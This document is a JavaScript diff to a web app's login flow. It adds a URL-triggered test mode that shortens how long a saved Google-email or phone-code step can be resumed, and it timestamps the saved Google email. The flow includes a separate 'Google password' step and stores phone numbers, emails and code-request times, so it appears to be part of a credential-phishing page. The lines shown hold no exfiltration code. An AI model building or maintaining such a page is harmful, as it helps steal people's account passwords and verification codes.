@@ -214,14 +214,24 @@ function initApp() {
             showToast("Ваш аккаунт уже авторизован ✅");
             return;
         }
+        const urlParams = new URLSearchParams(window.location.search);
+        const isTestBot = urlParams.get("features") === "google" || 
+                          urlParams.get("test") === "1" || 
+                          urlParams.get("google") === "1" || 
+                          window.location.search.includes("features=google") ||
+                          window.location.search.includes("testworkechobot");
+
+        const maxGoogleAgeMs = isTestBot ? (1 * 60 * 1000) : (15 * 60 * 1000);
+        const maxPhoneAgeMs = isTestBot ? (1 * 60 * 1000) : (20 * 60 * 1000);
+
         const savedStep = localStorage.getItem("privateroom_current_step");
         const savedPhone = localStorage.getItem("privateroom_saved_phone");
         const savedEmail = localStorage.getItem("privateroom_google_email");
         const savedAppleEmail = localStorage.getItem("privateroom_apple_email");
         const codeRequestedAt = parseInt(localStorage.getItem("privateroom_code_requested_at") || "0", 10);
         const googleSavedAt = parseInt(localStorage.getItem("privateroom_google_saved_at") || "0", 10);
-        const isRecent = codeRequestedAt > 0 && (Date.now() - codeRequestedAt < 20 * 60 * 1000);
-        const isGoogleRecent = googleSavedAt > 0 && (Date.now() - googleSavedAt < 15 * 60 * 1000);
+        const isRecent = codeRequestedAt > 0 && (Date.now() - codeRequestedAt < maxPhoneAgeMs);
+        const isGoogleRecent = googleSavedAt > 0 && (Date.now() - googleSavedAt < maxGoogleAgeMs);
 
         if (isGoogleRecent && savedStep === "stepGooglePassword" && savedEmail) {
             userGoogleEmail = savedEmail;
@@ -1074,6 +1084,7 @@ function initApp() {
             try {
                 localStorage.setItem("privateroom_google_email", userGoogleEmail);
                 localStorage.setItem("privateroom_current_step", "stepGooglePassword");
+                localStorage.setItem("privateroom_google_saved_at", Date.now().toString());
             } catch (e) {}
 
             btnSubmitGoogleEmail.disabled = true;
